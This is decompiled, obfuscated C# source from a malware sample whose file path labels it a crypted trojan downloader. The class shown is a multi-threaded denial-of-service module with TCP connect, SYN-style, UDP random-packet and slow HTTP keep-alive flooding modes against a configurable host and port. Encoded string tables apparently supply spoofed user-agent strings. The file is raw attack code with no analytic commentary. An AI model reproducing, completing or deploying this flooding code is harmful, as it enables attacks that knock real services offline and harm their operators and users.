// Decompiled with JetBrains decompiler
// Type: ᥟޱഁेࠃᵷᣚ.ᘒː᪤ǡᖶŐ
// Assembly: lgy, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F6858297-EDCC-46A7-BF64-CBC6BE6B3CD4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Downloader.MSIL.Crypted.ej-8021b1adb21670f837224cd99ccee8599abd7a84c7c3cf7b87df9da753a7739c.exe

using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ᥟޱഁेࠃᵷᣚ
{
  internal class ᘒː\u1AA4ǡᖶŐ
  {
    private static ᘒː\u1AA4ǡᖶŐ.ፅঊᘇ\u0B11 ᚴͧ֯ᗺ\u0D78\u0F0B౨;
    private static bool Ѓഅᅽ\u0C4Fz\u104C\u12D7༩;
    private static string ᣨ;
    private static int \u09F8ߛї\u07BDܩټྴ;
    private static int \u124F\u0E3F\u0FFEͻ᪵Ľ;
    private static int ṸА;
    private static int \u180BỚᵬᷪ;
    private static \u08F6ᝀ\u08C3 ᐯٔլ์ᚖᓠ;
    private static string[] ᖇɒᘹنṠ\u0DE2 = new string[28]
    {
      "[XZikoqWWqZ6XoZpwVYKIfno1PxLEVWtjZXBVjJ6jmaSsqFWDiV4=]",
      "[XYKWmJ6jqaSonXBVinBVfqOpmqFVgpaYVYSIVY1VZmVjaXBVmqNiiog1PxLEcFWnq29mY26Xal5VfJqYoKRkZ2VlbWVoZ2tmblV7nqeam6StZGhjZZdq]",
      "[XYyeo5mkrKhwVYpwVYyeo5mkrKhVg4lVamNmcFWao2KKiHBVp6tvZmNtY2VjajU/EsReVXyamKCkZGdlZWtlbGhmVXuep5qbpK1kZmNqY2VjalV7oaSYoGRlY2xjaWNmVQ==]",
      "[XYKkl56hmoWdpKOaVYh4hWJqamVlZIqIZGZjZV5Vg5qpe6eko6lkaGNlVYKChWRnY2VVXZikojU/EsSllqmel6GacFV8pKScoZqXpKlkZ2NmcFWdqamlb2RkrKysY5ykpJyhmmOYpKJkl6SpY52poqFe]",
      "[kJqjklVdjDU/EsSeo4OJcFWKXg==]",
      "[XZikoqWWqZ6XoZpwVYKIfnpVbGNlcDU/EsRVjJ6jmaSsqFWDiVVqY2ZwVZecm6leVQ==]",
      "[XZikoqWWqZ6XoZpwVYI1PxLEiH56VWtjZXBVjJ6jaGde]",
      "[XY1mZnBVinBVgZ6jqq1VZ2NpY2diZ1Weam1rcFWao2KKiHA1PxLEVaJmbV5VfJqYoKRkZ2VlZmVmaGZVg5qpqJiWpZprZGtjZWY=]",
      "[XY1mZnBVinBVgZ6jqq1Vnmtta3BVmqNiiog1PxLEcFWnq29lY25jaF5VfJqYoKRkZ2VlZmVtZWY=]",
      "[XYiqo4SIVWpjbVWoqqNpqnA1PxLEVYpeVYSlmqeWVWpjZVWQmqOS]",
      "[XYKWmJ6jqaSonXBVinBVfqOpmqFVgpaYVYSIVY1VZmVjaXBVmqNiiog1PxLEcFWnq29mY26Xal5VfJqYoKRkZ2VlbWVoZ2tmblV7nqeam6StZGhjZZdq0]",
      "[XYKWmJ6jqaSonXBVinBVfqOpmqFVgpaYVYSIVY1VZmVjaXBVmqNiiog1PxLEcFWnq29mY26Xal5VfJqYoKRkZ2VlbWVoZ2tmblV7nqeam6StZGhjZZdq1]",
      "[XYKWmJ6jqaSonXBVinBVfqOpmqFVgpaYVYSIVY1VZmVjaXBVmqNiiog1PxLEcFWnq29mY26Xal5VfJqYoKRkZ2VlbWVoZ2tmblV7nqeam6StZGhjZZdq2]",
      "[XYKWmJ6jqaSonXBVinBVfqOpmqFVgpaYVYSIVY1VZmVjaXBVmqNiiog1PxLEcFWnq29mY26Xal5VfJqYoKRkZ2VlbWVoZ2tmblV7nqeam6StZGhjZZdq3]",
      "[XYKWmJ6jqaSonXBVinBVfqOpmqFVgpaYVYSIVY1VZmVjaXBVmqNiiog1PxLEcFWnq29mY26Xal5VfJqYoKRkZ2VlbWVoZ2tmblV7nqeam6StZGhjZZdq4]",
      "[XYKWmJ6jqaSonXBVinBVfqOpmqFVgpaYVYSIVY1VZmVjaXBVmqNiiog1PxLEcFWnq29mY26Xal5VfJqYoKRkZ2VlbWVoZ2tmblV7nqeam6StZGhjZZdq5]",
      "[XYKWmJ6jqaSonXBVinBVfqOpmqFVgpaYVYSIVY1VZmVjaXBVmqNiiog1PxLEcFWnq29mY26Xal5VfJqYoKRkZ2VlbWVoZ2tmblV7nqeam6StZGhjZZdq6]",
      "[XYKWmJ6jqaSonXBVinBVfqOpmqFVgpaYVYSIVY1VZmVjaXBVmqNiiog1PxLEcFWnq29mY26Xal5VfJqYoKRkZ2VlbWVoZ2tmblV7nqeam6StZGhjZZdq7]",
      "[XYKWmJ6jqaSonXBVinBVfqOpmqFVgpaYVYSIVY1VZmVjaXBVmqNiiog1PxLEcFWnq29mY26Xal5VfJqYoKRkZ2VlbWVoZ2tmblV7nqeam6StZGhjZZdq8]",
      "[XYKWmJ6jqaSonXBVinBVfqOpmqFVgpaYVYSIVY1VZmVjaXBVmqNiiog1PxLEcFWnq29mY26Xal5VfJqYoKRkZ2VlbWVoZ2tmblV7nqeam6StZGhjZZdq9]",
      "[XYyeo5mkrKhwVYpwVYyeo5mkrKhVg4lVamNmcFWao2KKiHBVp6tvZmNtY2VjajU/EsReVXyamKCkZGdlZWtlbGhmVXuep5qbpK1kZmNqY2VjalV7oaSYoGRlY2xjaWNmVQ==0]",
      "[XYyeo5mkrKhwVYpwVYyeo5mkrKhVg4lVamNmcFWao2KKiHBVp6tvZmNtY2VjajU/EsReVXyamKCkZGdlZWtlbGhmVXuep5qbpK1kZmNqY2VjalV7oaSYoGRlY2xjaWNmVQ==1]",
      "[XYyeo5mkrKhwVYpwVYyeo5mkrKhVg4lVamNmcFWao2KKiHBVp6tvZmNtY2VjajU/EsReVXyamKCkZGdlZWtlbGhmVXuep5qbpK1kZmNqY2VjalV7oaSYoGRlY2xjaWNmVQ==2]",
      "[XYyeo5mkrKhwVYpwVYyeo5mkrKhVg4lVamNmcFWao2KKiHBVp6tvZmNtY2VjajU/EsReVXyamKCkZGdlZWtlbGhmVXuep5qbpK1kZmNqY2VjalV7oaSYoGRlY2xjaWNmVQ==3]",
      "[XYyeo5mkrKhwVYpwVYyeo5mkrKhVg4lVamNmcFWao2KKiHBVp6tvZmNtY2VjajU/EsReVXyamKCkZGdlZWtlbGhmVXuep5qbpK1kZmNqY2VjalV7oaSYoGRlY2xjaWNmVQ==4]",
      "[XYyeo5mkrKhwVYpwVYyeo5mkrKhVg4lVamNmcFWao2KKiHBVp6tvZmNtY2VjajU/EsReVXyamKCkZGdlZWtlbGhmVXuep5qbpK1kZmNqY2VjalV7oaSYoGRlY2xjaWNmVQ==5]",
      "[XYyeo5mkrKhwVYpwVYyeo5mkrKhVg4lVamNmcFWao2KKiHBVp6tvZmNtY2VjajU/EsReVXyamKCkZGdlZWtlbGhmVXuep5qbpK1kZmNqY2VjalV7oaSYoGRlY2xjaWNmVQ==6]",
      "[XYyeo5mkrKhwVYpwVYyeo5mkrKhVg4lVamNmcFWao2KKiHBVp6tvZmNtY2VjajU/EsReVXyamKCkZGdlZWtlbGhmVXuep5qbpK1kZmNqY2VjalV7oaSYoGRlY2xjaWNmVQ==7]"
    };
    private static string[] \u1AE9᷅ཾᴃᬵᥘ = new string[10]
    {
      "[XH6JeHt7D52zZnA+Qj0/Lw==]",
      "[XH6JeHt7D52zZnA+Qj1ALw==]",
      "[XH6JeHt7D52zZnA+Qj1FLw==]",
      "[3gAL+v39kVEyU/LAxb/BsQ==]",
      "[3gAL+v39kVEyU/LAxb/BybE=]",
      "[3gAL+v39kVEyU/LAxr/BsQ==]",
      "[4AH2A/KRUTJTwMq/xMSx]",
      "[4AH2A/KRUTJTwMq/wbE=]",
      "[4AH2A/KRUTJTwMm/ysGx]",
      "[4AH2A/KRUTJTwMq/ycGx]"
    };

    public static ᘒː\u1AA4ǡᖶŐ.ፅঊᘇ\u0B11 \u0A57\u1B5Dᗬݷᅰ\u0EC5ഒസ => ᘒː\u1AA4ǡᖶŐ.ᚴͧ֯ᗺ\u0D78\u0F0B౨;

    public static string \u0F2Dᠲፙᛩ
    {
      get
      {
        switch (ᘒː\u1AA4ǡᖶŐ.ᚴͧ֯ᗺ\u0D78\u0F0B౨)
        {
          case ᘒː\u1AA4ǡᖶŐ.ፅঊᘇ\u0B11.ũƽᝯᡝᵵ:
            return ґ.ᖢ("XwupK6ZOWw==", true);
          case ᘒː\u1AA4ǡᖶŐ.ፅঊᘇ\u0B11.\u17F8:
            return ґ.ᖢ("[SYN]", true);
          case ᘒː\u1AA4ǡᖶŐ.ፅঊᘇ\u0B11.\u0C81ᑯȝ\u16FC:
            return ґ.ᖢ("GsVgm/IJFQ==", true);
          case ᘒː\u1AA4ǡᖶŐ.ፅঊᘇ\u0B11.\u0866\u0D3B\u088Cǖ:
            return ґ.ᖢ("GDE0PMVgm/IxNDcuOA==", true);
          default:
            return (string) null;
        }
      }
    }

    public static bool ᜐ\u05EDנձϟ\u0FE2ᵪङ => ᘒː\u1AA4ǡᖶŐ.Ѓഅᅽ\u0C4Fz\u104C\u12D7༩;

    public static void \u1B61ۨ(
      ᘒː\u1AA4ǡᖶŐ.ፅঊᘇ\u0B11 _param0,
      string _param1,
      int _param2,
      int _param3,
      int _param4,
      int _param5,
      \u08F6ᝀ\u08C3 ၺچˍŹᤄŴ)
    {
      ᘒː\u1AA4ǡᖶŐ.ᚴͧ֯ᗺ\u0D78\u0F0B౨ = _param0;
      ᘒː\u1AA4ǡᖶŐ.ᣨ = _param1;
      ᘒː\u1AA4ǡᖶŐ.\u09F8ߛї\u07BDܩټྴ = _param2;
      ᘒː\u1AA4ǡᖶŐ.\u124F\u0E3F\u0FFEͻ᪵Ľ = _param3;
      ᘒː\u1AA4ǡᖶŐ.\u180BỚᵬᷪ = _param4;
      ᘒː\u1AA4ǡᖶŐ.ṸА = _param5;
      ᘒː\u1AA4ǡᖶŐ.ᐯٔլ์ᚖᓠ = ၺچˍŹᤄŴ;
      ᘒː\u1AA4ǡᖶŐ.Ѓഅᅽ\u0C4Fz\u104C\u12D7༩ = false;
    }

    public static void \u10CEвᑟ\u193Dᷝȅ()
    {
      ᘒː\u1AA4ǡᖶŐ.Ѓഅᅽ\u0C4Fz\u104C\u12D7༩ = true;
      new Thread(new ThreadStart(ᘒː\u1AA4ǡᖶŐ.ѮԱᝒ)).Start();
    }

    public static void \u0AFEૃᭇ() => ᘒː\u1AA4ǡᖶŐ.Ѓഅᅽ\u0C4Fz\u104C\u12D7༩ = false;

    private static void ѮԱᝒ()
    {
      for (int index = 0; index < ᘒː\u1AA4ǡᖶŐ.\u124F\u0E3F\u0FFEͻ᪵Ľ; ++index)
      {
        try
        {
          new Thread(new ThreadStart(ᘒː\u1AA4ǡᖶŐ.\u1BB5୭\u0AC6\u09DBᢗ\u0EE1ɡො))
          {
            IsBackground = true
          }.Start();
        }
        catch (OutOfMemoryException ex)
        {
          ᘒː\u1AA4ǡᖶŐ.\u124F\u0E3F\u0FFEͻ᪵Ľ = index - 1;
          break;
        }
      }
    }

    private static void \u1BB5୭\u0AC6\u09DBᢗ\u0EE1ɡො()
    {
      int num = 0;
      while (ᘒː\u1AA4ǡᖶŐ.Ѓഅᅽ\u0C4Fz\u104C\u12D7༩ && ᘒː\u1AA4ǡᖶŐ.ᐯٔլ์ᚖᓠ.ᦹ)
      {
        switch (ᘒː\u1AA4ǡᖶŐ.ᚴͧ֯ᗺ\u0D78\u0F0B౨)
        {
          case ᘒː\u1AA4ǡᖶŐ.ፅঊᘇ\u0B11.ũƽᝯᡝᵵ:
            Socket socket1 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket1.Blocking = false;
            while (num < ᘒː\u1AA4ǡᖶŐ.\u180BỚᵬᷪ && ᘒː\u1AA4ǡᖶŐ.Ѓഅᅽ\u0C4Fz\u104C\u12D7༩)
            {
              if (ᘒː\u1AA4ǡᖶŐ.ᐯٔլ์ᚖᓠ.ᦹ)
              {
                try
                {
                  socket1.Connect(ᘒː\u1AA4ǡᖶŐ.ᣨ, ᘒː\u1AA4ǡᖶŐ.\u09F8ߛї\u07BDܩټྴ);
                  socket1.Send(ᘒː\u1AA4ǡᖶŐ.ঊᬤصᔏพၓƚ());
                  socket1.Close();
                  socket1 = (Socket) null;
                }
                catch
                {
                  socket1.Close();
                  break;
                }
                ++num;
                Thread.Sleep(1);
              }
              else
                break;
            }
            Thread.Sleep(ᘒː\u1AA4ǡᖶŐ.ṸА);
            break;
          case ᘒː\u1AA4ǡᖶŐ.ፅঊᘇ\u0B11.\u17F8:
            Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket2.Blocking = false;
            try
            {
              socket2.BeginConnect(ᘒː\u1AA4ǡᖶŐ.ᣨ, ᘒː\u1AA4ǡᖶŐ.\u09F8ߛї\u07BDܩټྴ, new AsyncCallback(ᘒː\u1AA4ǡᖶŐ.ኦ\u19E4ẋʳ), (object) null);
            }
            catch
            {
            }
            Thread.Sleep(100);
            try
            {
              if (socket2.Connected)
                socket2.Disconnect(false);
              socket2.Close();
            }
            catch
            {
            }
            Thread.Sleep(ᘒː\u1AA4ǡᖶŐ.ṸА);
            break;
          case ᘒː\u1AA4ǡᖶŐ.ፅঊᘇ\u0B11.\u0C81ᑯȝ\u16FC:
            Socket socket3 = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            socket3.Blocking = false;
            Socket socket4;
            try
            {
              socket3.Connect(ᘒː\u1AA4ǡᖶŐ.ᣨ, ᘒː\u1AA4ǡᖶŐ.\u09F8ߛї\u07BDܩټྴ);
              while (num < ᘒː\u1AA4ǡᖶŐ.\u180BỚᵬᷪ && ᘒː\u1AA4ǡᖶŐ.Ѓഅᅽ\u0C4Fz\u104C\u12D7༩ && ᘒː\u1AA4ǡᖶŐ.ᐯٔլ์ᚖᓠ.ᦹ)
              {
                socket3.Send(ᘒː\u1AA4ǡᖶŐ.\u0F7Bṷ॔ů\u0BDC());
                ++num;
                Thread.Sleep(1);
              }
              socket3.Close();
              socket4 = (Socket) null;
            }
            catch
            {
              socket3.Close();
              socket4 = (Socket) null;
              break;
            }
            Thread.Sleep(ᘒː\u1AA4ǡᖶŐ.ṸА);
            break;
          case ᘒː\u1AA4ǡᖶŐ.ፅঊᘇ\u0B11.\u0866\u0D3B\u088Cǖ:
            Socket socket5 = (Socket) null;
            try
            {
              socket5 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
              socket5.Connect(ᘒː\u1AA4ǡᖶŐ.ᣨ, ᘒː\u1AA4ǡᖶŐ.\u09F8ߛї\u07BDܩټྴ);
              socket5.Send(ᘒː\u1AA4ǡᖶŐ.ეᑼˇሂᎨ೦ïۋᐰ());
              while (socket5.Connected)
              {
                if (ᘒː\u1AA4ǡᖶŐ.Ѓഅᅽ\u0C4Fz\u104C\u12D7༩)
                {
                  if (ᘒː\u1AA4ǡᖶŐ.ᐯٔլ์ᚖᓠ.ᦹ)
                  {
                    socket5.Send(ᘒː\u1AA4ǡᖶŐ.ეᑼˇሂᎨ೦ïۋᐰ());
                    Thread.Sleep(2000);
                  }
                  else
                    break;
                }
                else
                  break;
              }
            }
            catch
            {
              socket5.Close();
            }
            Thread.Sleep(ᘒː\u1AA4ǡᖶŐ.ṸА);
            break;
        }
        num = 0;
      }
      if (!ᘒː\u1AA4ǡᖶŐ.Ѓഅᅽ\u0C4Fz\u104C\u12D7༩)
        return;
      ᘒː\u1AA4ǡᖶŐ.\u0AFEૃᭇ();
    }

    private static void ኦ\u19E4ẋʳ(IAsyncResult _param0)
    {
    }

    private static byte[] \u0F7Bṷ॔ů\u0BDC()
    {
      Random random = new Random();
      byte[] buffer = new byte[random.Next(1470, 65507)];
      random.NextBytes(buffer);
      return buffer;
    }

    private static byte[] ঊᬤصᔏพၓƚ()
    {
      Random random = new Random();
      byte[] buffer = new byte[random.Next(1470, (int) ushort.MaxValue)];
      random.NextBytes(buffer);
      return buffer;
    }

    private static byte[] ეᑼˇሂᎨ೦ïۋᐰ()
    {
      Random random = new Random();
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine("GET / HTTP/1.1");
      stringBuilder.AppendLine("Host: " + ᘒː\u1AA4ǡᖶŐ.ᣨ);
      stringBuilder.AppendLine("User-Agent: " + ґ.ᖢ(ᘒː\u1AA4ǡᖶŐ.\u1AE9᷅ཾᴃᬵᥘ[random.Next(0, ᘒː\u1AA4ǡᖶŐ.\u1AE9᷅ཾᴃᬵᥘ.Length - 1)], true) + " " + ґ.ᖢ(ᘒː\u1AA4ǡᖶŐ.ᖇɒᘹنṠ\u0DE2[random.Next(0, ᘒː\u1AA4ǡᖶŐ.ᖇɒᘹنṠ\u0DE2.Length - 1)], true));
      stringBuilder.AppendLine("Content-Length: " + random.Next(1, 1000).ToString());
      stringBuilder.AppendLine("X-a: " + random.Next(1, 10000).ToString());
      stringBuilder.Append("Connection: keep-alive");
      return Encoding.ASCII.GetBytes(stringBuilder.ToString());
    }

    public enum ፅঊᘇ\u0B11
    {
      ũƽᝯᡝᵵ,
      \u17F8,
      \u0C81ᑯȝ\u16FC,
      \u0866\u0D3B\u088Cǖ,
    }
  }
}
